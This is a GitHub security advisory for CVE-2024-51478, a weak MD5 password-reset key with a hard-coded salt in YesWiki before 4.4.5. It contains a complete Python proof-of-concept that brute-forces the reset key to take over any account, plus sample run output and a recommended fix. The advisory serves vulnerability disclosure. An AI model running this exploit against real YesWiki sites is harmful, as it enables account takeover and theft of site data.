# [H] YesWiki Uses a Broken or Risky Cryptographic Algorithm

## Summary
Severity: High
Advisory: GHSA-4fvx-h823-38v3
CVE: CVE-2024-51478
CWE: CWE-327
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L (CVSS_V3)
Published: 2024-10-31
Source: https://github.com/advisories/GHSA-4fvx-h823-38v3
Type: github-advisory

## Affected
- Packagist: `yeswiki/yeswiki` — affected >=0 <4.4.5

## Details
### Summary
The use of a weak cryptographic algorithm and a hard-coded salt to hash the password reset key allows it to be recovered and used to reset the password of any account.

### Details
Firstly, the salt used to hash the password reset key is hard-coded in the `includes/services/UserManager.php` file at line `36` :

```php
private const PW_SALT = 'FBcA';
```

Next, the application uses a weak cryptographic algorithm to hash the password reset key. The hash algorithm is defined in the `includes/services/UserManager.php` file at line `201` :

```php
protected function generateUserLink($user)
{
    // Generate the password recovery key
    $key = md5($user['name'] . '_' . $user['email'] . random_int(0, 10000) . date('Y-m-d H:i:s') . self::PW_SALT);
```

The key is generated from the **user's name**, **e-mail address**, a random number **between 0 and 10000**, the **current date** of the request and the **salt**.
If we know the user's name and e-mail address, we can retrieve the key and use it to reset the account password with a bit of brute force on the random number.

### Proof of Concept (PoC)
To demonstrate the vulnerability, I created a python script to automatically retrieve the key and reset the password of a provided username and email.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Nishacid
# YesWiki <= 4.4.4 Account Takeover via Weak Password Reset Crypto

from hashlib import md5
from requests import post, get
from base64 import b64encode
from sys import exit
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from argparse import ArgumentParser

# Known data
salt = 'FBcA' # Hardcoded salt 
random_range = 10000  # Range for random_int()
WORKERS = 20 # Number of workers

# Arguments
def parseArgs():
    parser = ArgumentParser()
    parser.add_argument("-u", "--username", dest="username", default=None, help="Username of the account", required=True)
    parser.add_argument("-e", "--email", dest="email", default=None, help="Email of the account", required=True)
    parser.add_argument("-d", "--domain", dest="domain", default=None, help="Domain of the target", required=True)
    return parser.parse_args()

# Reset password request and get timestamp  
def reset_password(email: str, domain: str):
    response = post(
        f'{domain}?MotDePassePerdu',
        data={
            'email': email, 
            'subStep': '1'
        },
        headers={
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    )
    if response.ok:
        timestamp = datetime.now() # obtain the timestamp
        timestamp = timestamp.strftime('%Y-%m-%d %H:%M:%S')
        print(f"[*] Requesting link for {email} at {timestamp}")
        return timestamp
    else:
        print("[-] Error while resetting password.")
        exit()

# Generate and check keys
def check_key(random_int_val: int, timestamp_req: str, domain: str, username: str, email: str):
    user_base64 = b64encode(username.encode()).decode()
    data = f"{username}_{email}{random_int_val}{timestamp_req}{salt}"
    hash_candidate = md5(data.encode()).hexdigest()
    url = f"{domain}?MotDePassePerdu&a=recover&email={hash_candidate}&u={user_base64}"
    # print(f"[*] Checking {url}")
    response = get(url)
    
    # Check if the link is valid, warning depending on the language
    if '<strong>Bienvenu.e' in response.text or '<strong>Welcome' in response.text:
        return (True, random_int_val, hash_candidate, url)
    return (False, random_int_val, None, None)

def main(timestamp_req: str, domain: str, username: str, email: str):
    # Launch the brute-force
    print(f"[*] Starting brute-force, it can take few minutes...")
    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = [executor.submit(check_key, i, timestamp_req, domain, username, email) for i in range(random_range + 1)]
        
        for future in as_completed(futures):
            success, random_int_val, hash_candidate, url = future.result()
            if success:
                print(f"[+] Key found ! random_int: {random_int_val}, hash: {hash_candidate}")
                print(f"[+] URL: {url}")
                exit()
        else:
            print("[-] Key not found.")

if __name__ == "__main__":
    args = parseArgs()
    timestamp_req = reset_password(args.email, args.domain)
    main(timestamp_req, args.domain, args.username, args.email)
```

Simply run this script with the arguments `-u` for the username, `-e` for the email and `-d` for the target domain.

```bash
» python3 expoit.py --username 'admin' --email 'admin@nishacid.local' --domain 'http://localhost/' 
[*] Requesting link for admin@nishacid.local at 2024-10-30 10:46:48
[*] Starting brute-force, it can take few minutes...
[+] Key found ! random_int: 9264, hash: 22a2751f50ba74b259818394d34020c9
[+] URL: http://localhost/?MotDePassePerdu&a=recover&email=22a2751f50ba74b259818394d34020c9&u=YWRtaW4K
```

### Impact
Many impacts are possible, the most obvious being account takeover, which can lead to theft of sensitive data, modification of website content, addition/deletion of administrator accounts, user identity theft, etc.

### Recommendation 
The safest solution is to replace the salt with a random one and the hash algorithm with a more secure one.
For example, you can use [random bytes](https://www.php.net/manual/en/function.random-bytes.php) instead of a random integer.

## References
- https://github.com/YesWiki/yeswiki/security/advisories/GHSA-4fvx-h823-38v3
- https://nvd.nist.gov/vuln/detail/CVE-2024-51478
- https://github.com/YesWiki/yeswiki/commit/b5a8f93b87720d5d5f033a4b3a131ce0fb621dbc
- https://github.com/YesWiki/yeswiki/commit/e1285709f6f6a2277bd0075acf369f33cefd78f7
- https://github.com/YesWiki/yeswiki
